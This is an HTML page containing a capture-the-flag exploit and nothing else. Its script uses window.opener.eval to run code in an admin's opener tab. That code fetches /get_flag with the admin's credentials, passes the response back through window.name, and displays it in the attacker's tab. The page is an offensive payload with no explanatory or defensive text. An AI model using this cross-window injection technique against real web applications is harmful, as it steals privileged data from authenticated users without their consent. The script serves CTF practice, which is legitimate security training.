<!DOCTYPE html>
<html>
<body>
<script>
if (window.opener) {
  // This executes in the admin tab
  window.opener.eval(`
    fetch('/get_flag', { credentials: 'include' })
      .then(r => r.text())
      .then(flag => {
        window.name = flag;
      });
  `);

  // This executes in your (attacker's) tab
  setTimeout(() => {
    const win = window.open('', '_self');
    win.document.write('<h1>FLAG:</h1><pre>' + window.name + '</pre>');
  }, 1500);
}
</script>
</body>
</html>
